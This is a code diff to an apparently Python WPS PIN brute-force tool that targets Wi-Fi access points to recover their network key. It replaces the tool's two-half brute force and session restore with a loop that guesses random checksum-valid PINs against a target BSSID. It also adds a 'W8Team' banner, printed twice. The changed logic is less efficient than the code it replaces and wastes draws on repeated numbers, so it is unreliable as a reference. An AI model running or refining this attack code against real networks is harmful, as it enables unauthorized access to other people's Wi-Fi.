@@ -16,6 +16,11 @@ import statistics
 import csv
 from pathlib import Path
 from typing import Dict
+import random
+try:
+    from pyfiglet import Figlet
+except ImportError:
+    Figlet = None
 
 
 class NetworkAddress:
@@ -783,40 +788,29 @@ class Companion:
         return False
 
     def smart_bruteforce(self, bssid, start_pin=None, delay=None):
-        if (not start_pin) or (len(start_pin) < 4):
-            # Trying to restore previous session
-            try:
-                filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
-                with open(filename, 'r') as file:
-                    if input('[?] Restore previous session for {}? [n/Y] '.format(bssid)).lower() != 'n':
-                        mask = file.readline().strip()
-                    else:
-                        raise FileNotFoundError
-            except FileNotFoundError:
-                mask = '0000'
-        else:
-            mask = start_pin[:7]
-
-        try:
-            self.bruteforce = BruteforceStatus()
-            self.bruteforce.mask = mask
-            if len(mask) == 4:
-                f_half = self.__first_half_bruteforce(bssid, mask, delay)
-                if f_half and (self.connection_status.status != 'GOT_PSK'):
-                    self.__second_half_bruteforce(bssid, f_half, '001', delay)
-            elif len(mask) == 7:
-                f_half = mask[:4]
-                s_half = mask[4:]
-                self.__second_half_bruteforce(bssid, f_half, s_half, delay)
-            raise KeyboardInterrupt
-        except KeyboardInterrupt:
-            print("\nAborting…")
-            filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
-            with open(filename, 'w') as file:
-                file.write(self.bruteforce.mask)
-            print('[i] Session saved in {}'.format(filename))
-            if args.loop:
-                raise KeyboardInterrupt
+        # Random 8-digit WPS PINs with valid checksum
+        tried_pins = set()
+        self.bruteforce = BruteforceStatus()
+        while True:
+            # Generate random 7-digit base
+            base_pin = random.randint(0, 9999999)
+            base_pin_str = str(base_pin).zfill(7)
+            pin_int = int(base_pin_str)
+            checksum = self.generator.checksum(pin_int)
+            pin = base_pin_str + str(checksum)
+            if pin in tried_pins:
+                continue
+            tried_pins.add(pin)
+            self.bruteforce.mask = pin
+            self.single_connection(bssid, pin)
+            if self.connection_status.status == 'GOT_PSK':
+                break
+            if delay:
+                time.sleep(delay)
+            # Optional: stop after a very large number of attempts to avoid infinite loop
+            if len(tried_pins) >= 10000000:  # All possible 7-digit bases
+                print('Tried all possible random pins!')
+                break
 
     def cleanup(self):
         self.retsock.close()
@@ -1086,6 +1080,14 @@ Example:
 """
 
 
+def show_w8team_banner():
+    if Figlet:
+        f = Figlet(font='slant')
+        print(f.renderText('W8Team'))
+    else:
+        print('=== W8Team ===')
+
+
 if __name__ == '__main__':
     import argparse
 
@@ -1197,8 +1199,10 @@ if __name__ == '__main__':
     if not ifaceUp(args.interface):
         die('Unable to up interface "{}"'.format(args.interface))
 
+    show_w8team_banner()
     while True:
         try:
+            show_w8team_banner()
             companion = Companion(args.interface, args.write, print_debug=args.verbose)
             if args.pbc:
                 companion.single_connection(pbc_mode=True)
